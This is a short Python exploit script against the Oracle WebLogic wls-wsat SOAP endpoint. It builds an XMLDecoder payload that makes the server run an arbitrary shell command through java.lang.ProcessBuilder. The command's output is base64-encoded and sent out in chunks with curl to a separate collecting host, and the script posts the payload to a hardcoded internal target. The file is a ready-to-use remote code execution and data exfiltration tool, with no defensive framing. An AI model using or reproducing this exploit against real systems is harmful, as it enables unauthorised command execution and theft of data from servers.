#!/usr/bin/env python
#encoding=utf-8
import uuid
import re
import json
import sys
import time
import base64
import httplib

def payload(cmd,dns):
    command_filtered = "<string>for l in `%s|base64 -w 50|sed 's/=/_/g'`; do curl %s/$l; done;</string>"%(cmd,dns)
    payload_1 = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    <void index="0">
                      <string>/bin/sh</string>
                    </void>
                    <void index="1">
                      <string>-c</string>
                    </void>
                    <void index="2">
                      %s
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""%command_filtered
    return payload_1

def do_post(cmd):
    uid= str(uuid.uuid4())[:4]
    dns = "http://10.252.6.34/%s/"%uid
    reqheaders={
        'Content-type':'text/xml;charset=UTF-8',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Host':'10.248.103.30',
        'User-Agent':'Mozilla'
    }
    conn=httplib.HTTPConnection('10.248.103.30',9010)
    conn.request('POST', '/wls-wsat/CoordinatorPortType', payload(cmd,dns), reqheaders)
    res = conn.getresponse().read()
    if 'java.lang.ProcessBuilder' in str(res):
        print(res)
        return uid#DN.recv(uid)

if __name__=='__main__':
    import sys
    cmd = ' '.join(sys.argv[1:])
    print(cmd)
    print do_post(cmd)
